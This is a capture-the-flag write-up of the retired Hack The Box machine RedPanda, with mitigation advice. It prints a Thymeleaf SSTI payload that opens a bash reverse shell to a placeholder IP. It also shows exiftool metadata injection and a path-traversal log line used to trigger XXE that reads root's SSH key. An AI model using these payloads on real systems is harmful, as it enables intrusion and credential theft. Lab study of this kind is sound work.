---
machine: RedPanda
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, web, spring-boot, thymeleaf, ssti, xxe, jpeg, privesc]
---

# RedPanda — Hack The Box (Linux)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

The site is Spring Boot with Thymeleaf and a search box that concatenates input into the template. SSTI with `__${...}__::.x` runs commands as `woodenk`. That user is in the `logs` group and can write `redpanda.log`; the credit process reads the log path, extracts a JPG's `Artist` and opens an XML file with that name. Injecting a log line and a JPG with XXE reads root's SSH key.

## Recon

```bash
nmap -Pn -sCV -p22,8080 <IP>
```

- `22` OpenSSH and `8080` Spring Boot.
- The application shows panda images and a search box.
- `/export.xml` exposes the credit template.

## Enumeration

The search parameter is evaluated as a Thymeleaf expression. `__${7*7}__::.x` returns `49`; `T(java.lang.Runtime)` runs `id`. On the host, `woodenk` is in the `logs` group and `redpanda.log` is group-writable. The `/opt/panda_search` code builds paths from the JPG's `Artist`.

## Foothold

Run a reverse shell through the SSTI and get a session as `woodenk`.

```text
__${T(java.lang.Runtime).getRuntime().exec("bash -c 'bash -i >& /dev/tcp/<IP>/443 0>&1'")}__::.x
```

## Lateral movement

Not applicable: `woodenk` can already read the code and the log. The key is the relationship between the log, the image and the credit XML.

## Privilege escalation

Create a JPG with `exiftool -Artist="../tmp/x"` and an `x_creds.xml` whose entity reads `/root/.ssh/id_rsa`. Append a log line pointing at `/../../../../../../tmp/x.jpg` and wait for the cron. The process, running as root, resolves the path, reads `Artist`, opens the XML and writes the entity contents into `<root>`. Use the key to log in as root.

```bash
exiftool -Artist="../tmp/x" x.jpg
echo "412||ip||ua||/../../../../../../tmp/x.jpg" >> redpanda.log
```

## Evidence

- `49` returned by the Thymeleaf expression.
- `redpanda.log` writable by the `logs` group.
- JPG with a manipulated `Artist`.
- Root's private key in the credit XML.

## Lessons learned

- Thymeleaf evaluates expressions when user input reaches the template.
- Secondary groups can grant access to process files.
- Image metadata is untrusted input.
- XXE in a root process turns a file read into account takeover.

## Mitigation and detection

- Never build templates from user input; use context variables.
- Restrict log permissions and validate paths with `realpath`.
- Disable external entities in the XML parser.
- Monitor application log writes and SSH key access.

## References

- [0xdf — RedPanda](https://0xdf.gitlab.io/2022/11/26/htb-redpanda.html)
- [IppSec — RedPanda](https://www.youtube.com/watch?v=HqIUffFdjuI)
- [Hack The Box — RedPanda](https://app.hackthebox.com/machines/redpanda)
